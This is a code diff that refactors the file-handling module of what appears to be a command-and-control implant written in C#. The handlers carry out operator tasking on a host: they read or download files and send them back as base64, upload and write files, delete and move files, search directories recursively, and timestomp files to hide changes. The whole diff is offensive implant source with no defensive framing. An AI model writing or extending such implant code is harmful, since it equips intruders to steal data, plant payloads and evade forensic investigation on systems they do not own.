@@ -7,7 +7,6 @@ using Shared.Models;
 using System;
 using System.Collections.Generic;
 using System.IO;
-using System.Linq;
 
 namespace Agent.Modules
 {
@@ -73,14 +72,12 @@ namespace Agent.Modules
             };
         }
 
-        void CopyFile(string AgentID, C2Data C2Data)
+        void CopyFile(string AgentID, AgentTask Task)
         {
             try
             {
-                var parameters = Shared.Utilities.Utilities.DeserialiseData<TaskParameters>(C2Data.Data).Parameters;
-
-                var source = (string)parameters.FirstOrDefault(p => p.Name.Equals("Source", StringComparison.OrdinalIgnoreCase)).Value;
-                var destination = (string)parameters.FirstOrDefault(p => p.Name.Equals("Destination", StringComparison.OrdinalIgnoreCase)).Value;
+                var source = (string)Task.Parameters["Source"];
+                var destination = (string)Task.Parameters["Destination"];
 
                 File.Copy(source, destination, true);
             }
@@ -90,14 +87,12 @@ namespace Agent.Modules
             }
         }
 
-        void MoveFile(string AgentID, C2Data C2Data)
+        void MoveFile(string AgentID, AgentTask Task)
         {
             try
             {
-                var parameters = Shared.Utilities.Utilities.DeserialiseData<TaskParameters>(C2Data.Data).Parameters;
-
-                var source = (string)parameters.FirstOrDefault(p => p.Name.Equals("Source", StringComparison.OrdinalIgnoreCase)).Value;
-                var destination = (string)parameters.FirstOrDefault(p => p.Name.Equals("Destination", StringComparison.OrdinalIgnoreCase)).Value;
+                var source = (string)Task.Parameters["Source"];
+                var destination = (string)Task.Parameters["Destination"];
 
                 File.Move(source, destination);
             }
@@ -107,12 +102,11 @@ namespace Agent.Modules
             }
         }
 
-        void DeleteFile(string AgentID, C2Data C2Data)
+        void DeleteFile(string AgentID, AgentTask Task)
         {
             try
             {
-                var parameters = Shared.Utilities.Utilities.DeserialiseData<TaskParameters>(C2Data.Data).Parameters;
-                var path = (string)parameters.FirstOrDefault(p => p.Name.Equals("Path", StringComparison.OrdinalIgnoreCase)).Value;
+                var path = (string)Task.Parameters["Path"];
 
                 File.Delete(path);
             }
@@ -122,13 +116,11 @@ namespace Agent.Modules
             }
         }
 
-        void ReadFile(string AgentID, C2Data C2Data)
+        void ReadFile(string AgentID, AgentTask Task)
         {
             try
             {
-                var parameters = Shared.Utilities.Utilities.DeserialiseData<TaskParameters>(C2Data.Data).Parameters;
-                var path = (string)parameters.FirstOrDefault(p => p.Name.Equals("Path", StringComparison.OrdinalIgnoreCase)).Value;
-
+                var path = (string)Task.Parameters["Path"];
                 var text = File.ReadAllText(path);
                 Agent.SendMessage(text);
             }
@@ -138,13 +130,11 @@ namespace Agent.Modules
             }
         }
 
-        void DownloadFile(string AgentID, C2Data C2Data)
+        void DownloadFile(string AgentID, AgentTask Task)
         {
             try
             {
-                var parameters = Shared.Utilities.Utilities.DeserialiseData<TaskParameters>(C2Data.Data).Parameters;
-                var path = (string)parameters.FirstOrDefault(p => p.Name.Equals("Path", StringComparison.OrdinalIgnoreCase)).Value;
-
+                var path = (string)Task.Parameters["Path"];
                 var file = Convert.ToBase64String(File.ReadAllBytes(path));
                 Agent.SendMessage(file);
             }
@@ -154,13 +144,12 @@ namespace Agent.Modules
             }
         }
 
-        void UploadFile(string AgentID, C2Data C2Data)
+        void UploadFile(string AgentID, AgentTask Task)
         {
             try
             {
-                var parameters = Shared.Utilities.Utilities.DeserialiseData<TaskParameters>(C2Data.Data).Parameters;
-                var source = Convert.FromBase64String((string)parameters.FirstOrDefault(p => p.Name.Equals("Source", StringComparison.OrdinalIgnoreCase)).Value);
-                var destination = (string)parameters.FirstOrDefault(p => p.Name.Equals("Destination", StringComparison.OrdinalIgnoreCase)).Value;
+                var source = Convert.FromBase64String((string)Task.Parameters["Source"]);
+                var destination = (string)Task.Parameters["Destination"];
 
                 File.WriteAllBytes(destination, source);
             }
@@ -170,15 +159,12 @@ namespace Agent.Modules
             }
         }
 
-        void SearchFiles(string AgentID, C2Data C2Data)
+        void SearchFiles(string AgentID, AgentTask Task)
         {
             try
             {
-                var parameters = Shared.Utilities.Utilities.DeserialiseData<TaskParameters>(C2Data.Data).Parameters;
-
-                var path = (string)parameters.FirstOrDefault(p => p.Name.Equals("Path", StringComparison.OrdinalIgnoreCase)).Value;
-                var pattern = (string)parameters.FirstOrDefault(p => p.Name.Equals("Pattern", StringComparison.OrdinalIgnoreCase)).Value;
-
+                var path = (string)Task.Parameters["Path"];
+                var pattern = (string)Task.Parameters["Pattern"];
                 var files = Directory.GetFiles(path, pattern, SearchOption.AllDirectories);
                 var result = string.Join("\n", files);
 
@@ -190,14 +176,12 @@ namespace Agent.Modules
             }
         }
 
-        void TimeStompFile(string AgentID, C2Data C2Data)
+        void TimeStompFile(string AgentID, AgentTask Task)
         {
             try
             {
-                var parameters = Shared.Utilities.Utilities.DeserialiseData<TaskParameters>(C2Data.Data).Parameters;
-
-                var source = (string)parameters.FirstOrDefault(p => p.Name.Equals("Source", StringComparison.OrdinalIgnoreCase)).Value;
-                var target = (string)parameters.FirstOrDefault(p => p.Name.Equals("Target", StringComparison.OrdinalIgnoreCase)).Value;
+                var source = (string)Task.Parameters["Source"];
+                var target = (string)Task.Parameters["Target"];
 
                 var info = new FileInfo(source);
 
